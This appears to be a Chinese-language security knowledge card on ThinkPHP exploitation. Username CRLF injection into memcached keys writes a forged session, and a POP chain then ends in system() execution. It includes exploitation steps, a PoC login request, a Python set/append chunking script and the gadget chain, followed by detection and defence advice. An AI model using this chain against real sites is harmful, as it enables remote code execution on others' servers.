---
id: web-php-deserialization-thinkphp-memcached-crlf-session-poison-pivot-system-rce
title: ThinkPHP 会话 ID 拼进 memcached 命令造成 CRLF 注入：写入伪造会话让框架反序列化，走 TP5 Windows→Pivot→Request filter 链执行 system
type: scenario
domain: web
path: web/php/deserialization
technique: memcached-crlf-injection-session-poisoning-thinkphp-pop-chain
aliases:
- memcached CRLF 注入
- think:shop.admin 会话键
- Windows Pivot Pivot 反序列化链
- Request filter system call_user_func
- append 分块写缓存
tags:
- php
- deserialization
- thinkphp
- memcached
- crlf
- cache-poisoning
- session
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-05-16'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:37:33+08:00'
  notes: 已对照原文核对：username 拼接进 memcached 键（think:shop.admin|admin）后 CRLF 注入 set/append、%00 前缀、flags 4 exptime 500 bytes 长度、分块 150 字节且首块必须 set、登录 admin/555555 触发反序列化均与正文一致；POP 链 Windows→Pivot→BelongsTo→Query→Output→Memcache→Memcached→Request(filter=system) 与正文 PHP 类定义逐字段对应；原文未给 ThinkPHP 版本区间（仅称 thinkphp 框架），故不设 affected_versions；本次核对未读取图片，仅依据正文；未在本机复跑 PHP 链
---

## 一句话结论

应用把登录表单里的 `username` 直接拼进 memcached 的 key（`think:shop.<user>|<user>`），并在 key 之后原样拼接 `\r\n` 与 PHP 序列化串作为 value；于是在 `username` 里塞入 `\x00\r\nset <key> <flags> <exp> <bytes>\r\n<serialize_data>` 就能让 memcached 多执行一条 `set`，把伪造的会话内容写进框架自己的会话键。之后用对应账号登录，ThinkPHP 把这段由攻击者控制的 value 反序列化成 `think\model\Pivot` 等对象图，沿 `Windows → Pivot → BelongsTo → Query → console\Output → session\driver\Memcache → cache\driver\Memcached → Request` 走到 `Request::filterValue` 的 `call_user_func($filter, $value)`，`filter=system` 即命令执行。

## 原理

- **注入点是会话键的字符串拼接**：ThinkPHP 的 Memcached 会话驱动按 `prefix + session_name + id` 拼 key，登录逻辑又把用户输入的 `username` 并进 key 段。memcached 是**纯文本行协议**（`set <key> <flags> <exptime> <bytes>\r\n<data>\r\n`），只要 key 里出现 `\r\n`，服务端就认为这一行命令结束、下一行是新的命令——这就是最典型的存储型协议注入。原文用 `admin%00\r\nset ...`，`%00` 只是为了让前面那段「合法 key 前缀 + 用户输入」在 PHP 侧不影响后续解析。
- **为什么 `set` 能直接覆盖会话内容**：会话数据就存在 memcached 的 value 里。命中同名 key 的 `set` 会把原有 value 整段替换为攻击者给的字节串，所以不需要任何数据库或文件写权限，只要拿到「会话键名可预测」这一点即可（键名由固定的 `think:shop.` 前缀、应用名、用户 id 拼成）。
- **为什么 value 必须是 PHP 序列化串**：ThinkPHP 的 session 驱动在读取时对 value 走 `unserialize()`（带序列化开关的缓存驱动同样如此）。因此写进去的字节串就是一次完整的反序列化输入，`O:34:"think\process\pipes\Windows"` 之类的对象图会被真实还原，而不是当普通字符串。
- **POP 链闭合点**：`think\process\pipes\Windows::__destruct` 遍历 `$this->files`（数组里的元素被当成 `SplFileObject` 使用）；把元素换成 `think\model\Pivot`（`Model` 抽象类的具体子类），`__toString` 侧经 `append`/`error`/`parent` 属性走到 `think\model\relation\BelongsTo` → `think\db\Query`，Query 的 `model` 设为 `think\console\Output`，Output 的 `styles=['getAttr']` 与 `handle=think\session\driver\Memcache` 让未定义方法调用一路下传到 `cache\driver\Memcached`，最后落到 `think\Request`：`filter='system'`、`get=['jelly'=>命令]`。`Request::filterValue` 执行 `call_user_func($this->filter, $value)`，命令即被执行。
- **为什么链上要求 `options['prefix']` 非空**：`think\cache\driver\Memcached` 在取 key 时会读 `options['prefix']`，为空会提前抛错打断链，所以 payload 里必须显式给 `prefix => 'jelly/'`，并让 `Request` 的 `get` 键与之对应（`['jelly' => 命令]`）。
- **为什么需要分块 `append`**：memcached 的 `<bytes>` 声明长度必须与实际数据长度一致，而注入点一次能带过的字节数受上层表单/中间件长度限制（原文实测一次性塞入 1490 字节的序列化串会失败）。此时第一条用 `set` 建键（`append` 只能作用于已存在的键），后续每条用 `append` 追加一段，每段各自声明自己的长度，最终拼成完整序列化串。分块点不能落在序列化串的「长度前缀」与内容之间造成不一致——按固定块长机械切分之所以可行，是因为 memcached 侧只是字节拼接，PHP 侧最后拿到的仍是连续字节流。

## 触发条件

- 应用使用 ThinkPHP 的 memcached 会话/缓存驱动，key 由固定前缀 + 用户可控字段（用户名、会话 ID）拼接，且拼接前没有过滤 `\r`、`\n`、`\x00`；
- memcached 只监听内网/本机但可通过 Web 应用的这条注入路径到达，且无认证（默认无 SASL）；
- 后端类库完整：`think\process\pipes\Windows`、`think\model\Pivot`、`think\model\relation\BelongsTo`、`think\db\Query`、`think\console\Output`、`think\session\driver\Memcache`、`think\cache\driver\Memcached`、`think\Request` 均存在且属性名/访问级别与目标版本一致（原文按 ThinkPHP 5 系列）；
- 攻击者能用同一账号名登录以触发会话读取，或能命中已有会话键；
- 会话键可预测（前缀固定、用户 id 可枚举），否则需要先制造一个已知键。

## 利用步骤

1. 在登录接口用 `admin` / 任意密码登录并抓包，确认 `username` 被并进 memcached 键名：服务端返回的会话行为随用户名变化，说明键里带用户名。
2. 先做一次最小验证：`username=admin\x00\r\nset think:shop.admin|admin 4 500 <bytes>\r\n<一段改过 password 的合法序列化数组>`，登录后用改后的密码能进后台，即证明写入的 value 真的被反序列化并参与鉴权判断——这一步只验证「能写」，还没有 RCE。
3. 用与目标版本一致的 ThinkPHP 类在本地生成恶意序列化串（`serialize` 后 `urlencode`，私有属性 `\0类名\0属性名` 与 protected 属性 `\0*\0属性名` 必须写全），并把命令放在 `Request::get['jelly']`、`filter` 设为 `system`。
4. 用脚本按固定块长（如 150 字节）切成 N 段，第一段命令用 `set`、后续用 `append`，每段 `bytes` 写该段真实长度；逐条发出并留出间隔，避免上一条尚未落盘。
5. 用 `admin` 登录触发会话读取，反序列化即执行命令（无回显时用反弹 shell 或命令结果写入可访问目录）。
6. 若目标限制了 `secure_file_priv` 等文件操作面，本链不经过数据库，仍是有效路径——这也是它相对「后台 SQL `load_file`」的增量。

## PoC

注入命令（骨架，命令处替换为反弹或写文件语句）：

```
POST /public/index.php/index/admin/do_login.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20<bytes>%0D%0A<urlencode(serialize_data)>&password=admin
```

分块写法（第一块 `set` 建键，后续 `append` 追加；`chunk` 为已解码的序列化串片段）：

```python
for i in range(0, len(serialized), 150):
    chunk = serialized[i:i+150]
    op = "set" if i == 0 else "append"
    injection = "admin\x00\r\n%s think:shop.admin|admin 4 500 %d\r\n%s" % (op, len(chunk), chunk)
    post(field="username", value=injection)   # password 随意
```

恶意对象图（属性名与嵌套关系按原文，`<CMD>` 与 ref 地址需按目标 PHP 版本重算）：

```text
Windows(files = [ Pivot ])
  Pivot.append = ['jelly' => 'getError']
  Pivot.error  = BelongsTo(selfRelation=false, query=Query, bindAttr=[''])
    Query.model = Output(styles=['getAttr'], handle=Memcache)
      Memcache.handler = Memcached(options=['prefix'=>'jelly/'], tag=true)
        Memcached.handler = Request(filter='system', get=['jelly' => '<CMD>'])
  Pivot.parent = Output(...)  // 与上同构，用于让 __toString 侧真正走到 sink
```

触发：用 `admin` 登录即可。

## 变体与关联

- **变体（不改会话，只改缓存）**：同一 CRLF 注入点也可以直接覆盖业务缓存键，让某个 `unserialize` 的缓存读取点吃到恶意值，适用于会话键不可预测但缓存键固定的场景。
- **变体（分块方式）**：若 `append` 不可用，可改用 `set` + 位移（`set` 后跟 `append` 的等价命令）或把 payload 拆到多个用户名的键里再由业务逻辑拼接读取。
- **变体（键名不匹配时）**：先通过报错/日志泄露确认 session 键的真实格式（`prefix`、应用名、id 之间的分隔符），原文用的是 `think:shop.admin|admin` 这种「前缀:应用|用户」形式。
- **关联**：[[web-php-deserialization-simplepie-memcache-poisoning]]（同为「memcache 里的值被直接 `unserialize`」的缓存投毒，但那条靠 SSRF + gopher 写缓存，本卡靠应用自身的 CRLF 拼接注入）；[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]（TP6 同族 `Pivot` 入口链，说明本类链随版本迁移需要换入口点）。

## 检测与防御

- **入口**：拼 memcached key 前对 `\r`、`\n`、`\x00` 及所有控制字符做拒绝式过滤；key 只允许 `[A-Za-z0-9_.:-]`，并对长度限幅。**不要只做 `addslashes`/`escape`**——memcached 是文本协议，转义不改变行边界。
- **会话存储**：会话数据放服务端存储并用不可预测 ID（`session.use_strict_mode=1`），会话值不要走 PHP `serialize`/`unserialize`（改用 JSON 并只允许标量），或对序列化数据做 HMAC。
- **反序列化面**：`unserialize` 加 `allowed_classes` 白名单；从请求路径上排查 `think\process\pipes\Windows`、`think\model\Pivot`、`think\console\Output`、`think\cache\driver\Memcached` 这类可组合的高危类。
- **检测点**：`username`/`session id` 中出现 `%00`、`%0D%0A`、`set `、`append `；同一来源短时间内连续多次带不同 `bytes` 的登录请求（分块写缓存特征）；memcached 上出现 `think:` 前缀的会话键被 `set` 后立刻被读取；Web 进程派生 `bash`/`sh` 子进程。
- **加固**：memcached 绑定内网并开 SASL 或防火墙限制来源，Web 服务器不直连可写缓存；会话前缀加随机盐。
